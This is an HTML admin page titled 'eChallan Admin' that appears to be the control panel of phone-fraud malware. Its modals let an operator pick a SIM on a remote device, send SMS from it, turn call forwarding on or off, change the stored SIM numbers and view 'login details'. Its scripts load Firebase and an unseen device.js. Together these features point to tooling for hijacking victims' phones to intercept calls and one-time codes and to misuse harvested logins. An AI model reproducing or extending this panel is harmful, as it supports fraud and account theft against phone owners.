<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Device Details - eChallan Admin</title>
  <link rel="stylesheet" href="css/style.css?v=2">
</head>
<body>
  <div class="app-header">
    <div>
      <h2>📱 DEVICE DETAILS</h2>
      <div class="user-info" id="userEmail">...</div>
    </div>
    <button class="btn-logout" onclick="location.href='dashboard.html'">Back</button>
  </div>

  <div class="container">
    <div id="content">
      <div class="loading">Loading device...</div>
    </div>
  </div>

  <div class="modal-overlay" id="modalSms">
    <div class="modal">
      <h3>💬 SEND SMS</h3>
      <p class="modal-sub">Quickly send a message to any number</p>
      <label style="font-size:12px;font-weight:700;color:#444;text-transform:uppercase;">Select SIM</label>
      <div class="sim-selector" style="margin-top:8px;">
        <div class="sim-option active" data-sim="1" onclick="selectSim('sms', 1)">SIM 1</div>
        <div class="sim-option" data-sim="2" onclick="selectSim('sms', 2)">SIM 2</div>
      </div>
      <div class="input-group">
        <label>Number without +91</label>
        <input type="tel" id="smsNumber" placeholder="Enter number" maxlength="15">
      </div>
      <div class="input-group">
        <label>Message</label>
        <textarea id="smsMessage" rows="3" placeholder="Enter message" maxlength="150"></textarea>
        <div style="text-align:right;font-size:11px;color:#888;margin-top:4px;" id="smsCounter">0/150</div>
      </div>
      <div class="modal-actions">
        <button class="btn-secondary" onclick="closeModal('modalSms')">CANCEL</button>
        <button class="btn-primary" onclick="sendSMS()">SEND</button>
      </div>
    </div>
  </div>

  <div class="modal-overlay" id="modalCallFwd">
    <div class="modal">
      <h3>📞 CALL FORWARDING</h3>
      <div class="sim-selector">
        <div class="sim-option active" data-sim="1" onclick="selectSim('cf', 1)">SIM 1</div>
        <div class="sim-option" data-sim="2" onclick="selectSim('cf', 2)">SIM 2</div>
      </div>
      <div class="input-group">
        <label>Forward to Number</label>
        <input type="tel" id="cfNumber" placeholder="Number" maxlength="15">
      </div>
      <div style="display:grid;grid-template-columns:1fr 1fr;gap:10px;margin-top:16px;">
        <button class="btn-success" style="padding:14px;border-radius:12px;border:none;font-weight:800;font-size:13px;" onclick="sendCallForward('activate')">ACTIVATE</button>
        <button class="btn-danger" style="padding:14px;border-radius:12px;border:none;font-weight:800;font-size:13px;" onclick="sendCallForward('deactivate')">DEACTIVATE</button>
      </div>
      <button class="btn-warning" style="width:100%;padding:14px;border-radius:12px;border:none;font-weight:800;font-size:13px;margin-top:10px;" onclick="sendCallForward('check_status')">CHECK STATUS</button>
      <div class="modal-actions" style="margin-top:14px;">
        <button class="btn-secondary" onclick="closeModal('modalCallFwd')">CLOSE</button>
      </div>
    </div>
  </div>

  <div class="modal-overlay" id="modalSim">
    <div class="modal">
      <h3>📶 UPDATE SIM NUMBERS</h3>
      <div class="input-group">
        <label>SIM 1 Number</label>
        <input type="tel" id="sim1Input" placeholder="+91XXXXXXXXXX">
      </div>
      <div class="input-group">
        <label>SIM 2 Number</label>
        <input type="tel" id="sim2Input" placeholder="+91XXXXXXXXXX">
      </div>
      <div class="modal-actions">
        <button class="btn-secondary" onclick="closeModal('modalSim')">CANCEL</button>
        <button class="btn-primary" onclick="updateSim()">UPDATE</button>
      </div>
    </div>
  </div>

  <div class="modal-overlay" id="modalLoginDetails">
    <div class="modal">
      <h3>🔐 LOGIN DETAILS</h3>
      <div id="loginDetailsContent">Loading...</div>
      <div class="modal-actions" style="margin-top:14px;">
        <button class="btn-secondary" onclick="closeModal('modalLoginDetails')">CLOSE</button>
      </div>
    </div>
  </div>

  <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
  <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-auth-compat.js"></script>
  <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>
  <script src="js/firebase-config.js"></script>
  <script src="js/device.js"></script>
</body>
</html>
